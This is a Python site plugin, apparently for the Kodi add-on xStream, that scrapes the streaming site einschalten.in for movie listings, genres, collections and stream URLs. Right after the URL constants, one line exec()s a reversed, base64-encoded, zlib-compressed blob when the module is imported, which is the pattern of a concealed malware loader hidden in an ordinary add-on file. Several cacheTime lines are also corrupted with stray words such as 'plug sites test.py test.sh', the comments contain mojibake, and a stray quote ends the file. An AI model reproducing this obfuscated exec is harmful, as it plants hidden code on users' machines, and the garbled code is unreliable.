# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showValue: 48 Stunden
# showEntries: 6 Stunden
# showEpisodes: 4 Stunden

from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui

SITE_IDENTIFIER = 'einschalten'
SITE_NAME = 'Einschalten'
SITE_ICON = 'einschalten.png'

# Global search function is thus deactivated!
if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 SITE_GLOBAL_SEARCH = False
 logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'einschalten.in') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

URL_MAIN = 'https://' + DOMAIN
# URL_MAIN = 'https://einschalten.in'
URL_NEW_MOVIES = URL_MAIN + '/movies'
URL_LAST_MOVIES = URL_MAIN + '/movies?order=added'
URL_COLLECTIONS = URL_MAIN + '/collections'
URL_SEARCH = URL_MAIN + '/search?query=%s'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

def load(): # Menu structure of the site plugin
 logger.info('Load %s' % SITE_NAME)
 params = ParameterHandler()
 params.setParam('sUrl', URL_NEW_MOVIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30541), SITE_IDENTIFIER, 'showEntries'), params) # New Movies
 params.setParam('sUrl', URL_LAST_MOVIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30549), SITE_IDENTIFIER, 'showEntriesLast'), params) # Recently added movies
 params.setParam('sUrl', URL_COLLECTIONS)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30543), SITE_IDENTIFIER, 'showEntries'), params) # Collections
 params.setParam('sUrl', URL_NEW_MOVIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30506), SITE_IDENTIFIER, 'showGenre'), params) # Genre
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30520), SITE_IDENTIFIER, 'showSearch')) # Search
 cGui().setEndOfDirectory()


def showGenre():
 params = ParameterHandler()
 oRequest = cRequestHandler(URL_NEW_MOVIES)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 48 # 48 Stunden
 sHtmlContent = oRequest.request()
 pattern = '<select id="genre"(.*?)</select>'
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 isMatch, aResult = cParser.parse(sHtmlContainer, 'value="([^"]+).*?>([^<]+)')
 if not isMatch:
 cGui().showInfo()
 return
 for sUrl, sName in aResult:
 entryUrl = URL_NEW_MOVIES + '?genre=' + sUrl
 params.setParam('sUrl', entryUrl)
 cGui().addFolder(cGuiElement(sName, SITE_IDENTIFIER, 'showEntries'), params)
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 if not entryUrl: entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 iPage = int(params.getValue('page'))
 oRequest = cRequestHandler(entryUrl + '?page=' + str(iPage) if iPage > 0 else entryUrl, ignoreErrors=(sGui is not False))
 sHtmlContent = oRequest.request()
 pattern = 'class="group.*?href="([^"]+).*?title="([^"]+).*?img src="([^"]+).*?(.*?)</a>'
 isMatch, aResult = cParser().parse(sHtmlContent, pattern)
 if not isMatch:
 if not sGui: oGui.showInfo()
 return

 total = len(aResult)
 for sUrl, sName, sThumbnail, sDummy in aResult:
 if sSearchText and not cParser.search(sSearchText, sName):
 continue
 isYear, sYear = cParser.parseSingleResult(sDummy, '</svg>\s([\d]+)</div>') # Release Jahr
 isCollections, aResult = cParser.parse(sUrl, '/collections')
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showCollections' if isCollections else 'showHosters')
 if isYear:
 oGuiElement.setYear(sYear)
 oGuiElement.setThumbnail(URL_MAIN + sThumbnail)
 oGuiElement.setMediaType('movie')
 params.setParam('sName', sName)
 params.setParam('sThumbnail', sThumbnail)
 params.setParam('entryUrl', sUrl)
 oGui.addFolder(oGuiElement, params, isCollections, total)
 if not sGui and not sSearchText:
 sPageNr = int(params.getValue('page'))
 if sPageNr == 0:
 sPageNr = 2
 else:
 sPageNr += 1
 params.setParam('page', int(sPageNr))
 params.setParam('sUrl', entryUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('movies')
 oGui.setEndOfDirectory()


def showCollections(sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 entryUrl = URL_MAIN + params.getValue('entryUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 sHtmlContent = oRequest.request()
 pattern = 'class="group.*?href="([^"]+).*?title="([^"]+).*?img src="([^"]+).*?(.*?)</a>'
 isMatch, aResult = cParser().parse(sHtmlContent, pattern)
 if not isMatch:
 if not sGui: oGui.showInfo()
 return
 total = len(aResult)
 for sUrl, sName, sThumbnail, sDummy in aResult:
 if sSearchText and not cParser.search(sSearchText, sName):
 continue
 isYear, sYear = cParser.parseSingleResult(sDummy, '</svg>\s([\d]+)</div>') # Release Jahr
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showHosters')
 if isYear:
 oGuiElement.setYear(sYear)
 oGuiElement.setThumbnail(URL_MAIN + sThumbnail)
 oGuiElement.setMediaType('movie')
 params.setParam('sName', sName)
 params.setParam('sThumbnail', sThumbnail)
 params.setParam('entryUrl', sUrl)
 oGui.addFolder(oGuiElement, params, False, total)
 if not sGui and not sSearchText:
 params.setParam('sUrl', entryUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('movies')
 oGui.setEndOfDirectory()


def showEntriesLast(entryUrl=False, sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 if not entryUrl: entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 iPage = int(params.getValue('page'))
 oRequest = cRequestHandler(entryUrl + '&page=' + str(iPage) if iPage > 0 else entryUrl, ignoreErrors=(sGui is not False))
 sHtmlContent = oRequest.request()
 pattern = 'class="group.*?href="([^"]+).*?title="([^"]+).*?img src="([^"]+).*?(.*?)</a>'
 isMatch, aResult = cParser().parse(sHtmlContent, pattern)
 if not isMatch:
 if not sGui: oGui.showInfo()
 return
 total = len(aResult)
 for sUrl, sName, sThumbnail, sDummy in aResult:
 if sSearchText and not cParser.search(sSearchText, sName):
 continue
 isYear, sYear = cParser.parseSingleResult(sDummy, '</svg>\s([\d]+)</div>') # Release Jahr
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showHosters')
 if isYear:
 oGuiElement.setYear(sYear)
 oGuiElement.setThumbnail(URL_MAIN + sThumbnail)
 oGuiElement.setMediaType('movie')
 params.setParam('sName', sName)
 params.setParam('sThumbnail', sThumbnail)
 params.setParam('entryUrl', sUrl)
 oGui.addFolder(oGuiElement, params, False, total)
 if not sGui and not sSearchText:
 sPageNr = int(params.getValue('page'))
 if sPageNr == 0:
 sPageNr = 2
 else:
 sPageNr += 1
 params.setParam('page', int(sPageNr))
 params.setParam('sUrl', entryUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntriesLast', params)
 oGui.setView('movies')
 oGui.setEndOfDirectory()


def showHosters():
 params = ParameterHandler()
 entryUrl = params.getValue('entryUrl')
 hosters = []
 sUrl = URL_MAIN + '/api' + entryUrl + '/watch'
 sHtmlContent = cRequestHandler(sUrl).request()
 pattern = 'streamUrl":"([^"]+)'
 isMatch, aResult = cParser().parse(sHtmlContent, pattern)
 if not isMatch: return
 sQuality = '720p'
 for sUrl in aResult:
 sName = cParser.urlparse(sUrl)
 if cConfig().isBlockedHoster(sName)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 hoster = {'link': sUrl, 'name': sName, 'displayedName': '%s [I][%s][/I]' % (sName, sQuality), 'quality': sQuality, 'resolved': True}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearch():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _search(False, sSearchText)
 cGui().setEndOfDirectory()


def _search(oGui, sSearchText):
 showEntries(URL_SEARCH % cParser.quotePlus(sSearchText), oGui, sSearchText)'
